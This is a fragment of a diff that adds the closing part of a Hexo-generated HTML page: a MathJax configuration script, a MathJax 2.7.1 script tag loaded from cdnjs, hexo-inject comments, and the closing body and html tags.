+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+  </body>
+</html>
